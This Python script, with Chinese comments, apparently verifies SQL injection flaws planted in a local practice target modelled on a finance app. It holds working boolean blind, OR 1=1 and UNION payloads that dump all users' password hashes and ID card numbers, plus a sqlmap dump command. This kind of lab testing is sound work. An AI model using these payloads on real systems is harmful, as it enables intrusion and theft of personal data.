#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL注入漏洞验证脚本 - 云享财富靶机

测试三处注入点：
  漏洞8：POST /login           username 字段（UNION注入，绕过认证）
  漏洞9：GET /api/account/<id> keyword 参数（LIKE注入，数据泄露）
  漏洞10：GET /api/messages     type 参数（字符串注入，越权读取）
"""

import sys
import requests

BASE_URL = "http://localhost:5000"

OK   = "\033[92m[✓]\033[0m"
FAIL = "\033[91m[✗]\033[0m"
INFO = "\033[94m[*]\033[0m"
WARN = "\033[93m[!]\033[0m"


def check_server():
    try:
        requests.get(BASE_URL, timeout=3)
    except requests.exceptions.ConnectionError:
        print(f"{FAIL} 无法连接到 {BASE_URL}")
        print("    请先启动应用：python app.py")
        sys.exit(1)


def login(username, password):
    s = requests.Session()
    r = s.post(f"{BASE_URL}/login",
               data={"username": username, "password": password},
               allow_redirects=False)
    return s if r.status_code == 302 else None


# ─────────────────────────────────────────────
# 漏洞8：登录接口 username 字段 —— 布尔盲注
# ─────────────────────────────────────────────
def get_response_hint(resp_html):
    """从响应 HTML 中提取 flash 提示文字"""
    for keyword in ("账户不存在", "密码错误", "登录成功"):
        if keyword in resp_html:
            return keyword
    return "(无提示)"


def test_login_injection():
    print("\n" + "─" * 56)
    print("  漏洞8：POST /login  username 字段 SQL注入（布尔盲注）")
    print("─" * 56)

    def post_login(username, password="wrongpassword"):
        r = requests.post(f"{BASE_URL}/login",
                          data={"username": username, "password": password},
                          allow_redirects=True)
        return r.text

    # 对照组：正常存在的用户 → "密码错误"
    hint_exist = get_response_hint(post_login("zhangsan"))
    # 对照组：不存在的用户 → "账户不存在"
    hint_not_exist = get_response_hint(post_login("no_such_user_xyz"))

    print(f"{INFO} 正常用户（zhangsan）+ 错误密码 → 提示：「{hint_exist}」")
    print(f"{INFO} 不存在用户               + 错误密码 → 提示：「{hint_not_exist}」")

    if hint_exist == hint_not_exist:
        print(f"{FAIL} 两种情况提示相同，布尔盲注无法区分，注入点设计有问题")
        return

    print(f"\n{OK} 两种提示不同，构成布尔 oracle，可进行盲注：")
    print(f"    「{hint_exist}」   → 查询有返回行（条件为真）")
    print(f"    「{hint_not_exist}」 → 查询无返回行（条件为假）")

    # 布尔验证：AND 1=1（真） vs AND 1=2（假）
    # payload 注入后 SQL：WHERE username = 'zhangsan' AND '1'='1'
    hint_true  = get_response_hint(post_login("zhangsan' AND '1'='1"))
    hint_false = get_response_hint(post_login("zhangsan' AND '1'='2"))
    print(f"\n{INFO} 注入 AND '1'='1 → 提示：「{hint_true}」")
    print(f"{INFO} 注入 AND '1'='2 → 提示：「{hint_false}」")

    if hint_true == hint_exist and hint_false == hint_not_exist:
        print(f"{OK} 漏洞验证成功：布尔条件控制查询是否返回行，注入点有效")
    else:
        print(f"    提示不符合预期，请检查数据库数据")

    # 演示字符提取：盲注读取第一个用户名的第一个字母
    # SQL：WHERE username = '' OR (SELECT substr(username,1,1) FROM users LIMIT 1) = 'z'--
    print(f"\n{INFO} 演示字符提取（盲注读取 users 表第一行 username 首字母）：")
    found_char = None
    for c in "abcdefghijklmnopqrstuvwxyz":
        pl = f"' OR (SELECT substr(username,1,1) FROM users LIMIT 1)='{c}'--"
        hint = get_response_hint(post_login(pl))
        if hint == hint_exist:
            found_char = c
            break
    if found_char:
        print(f"{WARN} 第一个用户 username 首字母为：'{found_char}'")
        print(f"{OK} 字符提取成功，可逐字符枚举全部数据")
    else:
        print(f"    未匹配到字母，检查 payload 格式")

    print(f"\n  sqlmap 扫描命令（POST 表单，布尔盲注）：")
    print(f'  sqlmap -u "{BASE_URL}/login" \\')
    print(f'    --data="username=zhangsan&password=test" \\')
    print(f'    -p username --dbms=sqlite \\')
    print(f'    --string="密码错误" \\')
    print(f'    --technique=B --level=2 --dump')


# ─────────────────────────────────────────────
# 漏洞9：/api/account/<id>?keyword= —— LIKE注入
# ─────────────────────────────────────────────
def test_account_keyword_injection(session):
    print("\n" + "─" * 56)
    print("  漏洞9：GET /api/account/<id>?keyword=  SQL注入")
    print("─" * 56)

    # 正常请求
    normal = session.get(f"{BASE_URL}/api/account/1",
                         params={"keyword": "转账"}).json()
    count_normal = len(normal.get("data", {}).get("transactions", []))
    print(f"{INFO} 正常请求 keyword=转账：{count_normal} 条记录")

    # 布尔验证：AND 1=1 vs AND 1=2 的差异
    # payload 闭合方式：description LIKE '%{keyword}%'  →  '%x%') AND 1=1--
    r_true  = session.get(f"{BASE_URL}/api/account/1",
                          params={"keyword": "x%') AND 1=1--"})
    r_false = session.get(f"{BASE_URL}/api/account/1",
                          params={"keyword": "x%') AND 1=2--"})
    cnt_t = len(r_true.json().get("data", {}).get("transactions", []))
    cnt_f = len(r_false.json().get("data", {}).get("transactions", []))
    print(f"{INFO} 布尔注入  AND 1=1 → {cnt_t} 条  |  AND 1=2 → {cnt_f} 条")
    if cnt_t != cnt_f:
        print(f"{OK} 布尔响应差异确认，注入点有效")

    # OR 1=1 —— 读取全库所有账户的交易记录
    r_all = session.get(f"{BASE_URL}/api/account/1",
                        params={"keyword": "%') OR 1=1--"})
    cnt_all = len(r_all.json().get("data", {}).get("transactions", []))
    print(f"{INFO} OR 1=1 注入：返回 {cnt_all} 条（本账户 vs 全库）")
    if cnt_all > count_normal:
        print(f"{WARN} 获取到其他账户的交易记录（共 {cnt_all} 条）")

    # UNION注入 —— 泄露所有用户名 + 密码哈希
    # 主查询7列：id, trans_type, amount, balance_after, description, target_account, created_at
    union_pl = "%') UNION SELECT id, username, password_hash, 0, email, phone, created_at FROM users--"
    r_union = session.get(f"{BASE_URL}/api/account/1",
                          params={"keyword": union_pl})
    rows = r_union.json().get("data", {}).get("transactions", [])
    # amount 列此时为 password_hash 字符串（werkzeug 格式以 pbkdf2 开头）
    leaked = [r for r in rows
              if isinstance(r.get("amount"), str) and r["amount"].startswith("pbkdf2")]
    if leaked:
        print(f"\n{WARN} UNION注入成功，泄露 {len(leaked)} 条用户凭据：")
        for row in leaked:
            print(f"    用户名: {row['trans_type']:<12} 密码哈希: {row['amount'][:50]}...")
        print(f"{OK} 漏洞验证成功：通过 keyword 参数读取到所有用户密码哈希")
    else:
        print(f"{FAIL} UNION注入未返回预期数据，rows={len(rows)}，检查 payload")

    print(f"\n  Payload : {union_pl}")


# ─────────────────────────────────────────────
# 漏洞10：/api/messages?type= —— 字符串注入
# ─────────────────────────────────────────────
def test_messages_type_injection(session):
    print("\n" + "─" * 56)
    print("  漏洞10：GET /api/messages?type=  SQL注入")
    print("─" * 56)

    # 正常请求
    normal = session.get(f"{BASE_URL}/api/messages",
                         params={"type": "系统通知"}).json()
    count_normal = len(normal.get("data", []))
    print(f"{INFO} 正常请求 type=系统通知：{count_normal} 条消息")

    # 布尔验证
    r_true  = session.get(f"{BASE_URL}/api/messages",
                          params={"type": "系统通知' AND '1'='1"})
    r_false = session.get(f"{BASE_URL}/api/messages",
                          params={"type": "系统通知' AND '1'='2"})
    cnt_t = len(r_true.json().get("data", []))
    cnt_f = len(r_false.json().get("data", []))
    print(f"{INFO} 布尔注入  AND '1'='1 → {cnt_t} 条  |  AND '1'='2 → {cnt_f} 条")
    if cnt_t != cnt_f:
        print(f"{OK} 布尔响应差异确认，注入点有效")

    # OR '1'='1 —— 绕过 user_id 过滤，读取全库消息
    r_all = session.get(f"{BASE_URL}/api/messages",
                        params={"type": "' OR '1'='1"})
    cnt_all = len(r_all.json().get("data", []))
    print(f"{INFO} OR '1'='1 注入：返回 {cnt_all} 条（当前用户 vs 全库）")
    if cnt_all > count_normal:
        print(f"{WARN} 成功绕过 user_id，额外读取了 {cnt_all - count_normal} 条其他用户消息")

    # UNION注入 —— 泄露所有用户身份证号
    # 主查询5列：id, title, msg_type, is_read, created_at
    # 注入后：title=real_name，msg_type=id_card（18位）
    union_pl = "' UNION SELECT id, real_name, id_card, 0, created_at FROM users--"
    r_union = session.get(f"{BASE_URL}/api/messages",
                          params={"type": union_pl})
    rows = r_union.json().get("data", [])
    # id_card 为 18 位数字字符串，出现在 msg_type 字段
    leaked = [r for r in rows
              if isinstance(r.get("msg_type"), str) and len(r["msg_type"]) == 18
              and r["msg_type"].isdigit()]
    if leaked:
        print(f"\n{WARN} UNION注入成功，泄露 {len(leaked)} 条用户身份信息：")
        for row in leaked:
            print(f"    姓名: {row['title']:<8} 身份证号: {row['msg_type']}")
        print(f"{OK} 漏洞验证成功：通过 type 参数读取到所有用户身份证号")
    else:
        print(f"{FAIL} UNION注入未返回预期数据，rows={len(rows)}，检查 payload")

    print(f"\n  Payload : {union_pl}")


# ─────────────────────────────────────────────
def main():
    print("=" * 56)
    print("  SQL注入漏洞验证脚本 — 云享财富靶机")
    print("=" * 56)

    check_server()

    # 漏洞8：登录注入（无需预先登录）
    test_login_injection()

    # 获取正常会话用于后续测试
    print(f"\n{INFO} 获取正常测试会话（zhangsan / 123456）...")
    session = login("zhangsan", "123456")
    if not session:
        print(f"{FAIL} 正常登录失败，无法继续")
        sys.exit(1)

    # 漏洞9：keyword 注入
    test_account_keyword_injection(session)

    # 漏洞10：type 注入
    test_messages_type_injection(session)

    print("\n" + "=" * 56)
    print("  验证完毕")
    print("=" * 56 + "\n")


if __name__ == "__main__":
    main()
